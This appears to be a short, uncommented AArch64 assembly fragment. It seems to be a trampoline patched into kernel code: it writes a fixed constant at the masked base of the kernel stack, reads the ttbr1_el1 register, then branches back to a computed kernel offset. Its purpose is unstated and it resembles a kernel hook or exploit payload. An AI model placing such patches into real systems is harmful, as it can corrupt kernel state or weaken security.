0:
	stp	x0,x1,[sp,-16]!
	add	x0, sp, -1024
	and	x0, x0, #0xffffffffffffc000
	ldr	x1, addr
	str	x1, [x0]
	mrs	x1,ttbr1_el1
	ldp	x0,x1,[sp]
	add	sp,sp,16
	b	0b - . + 0xc03110 - 0xc02080
	.align	4
addr:	.quad 0x2ff2a7a37b5a3da3
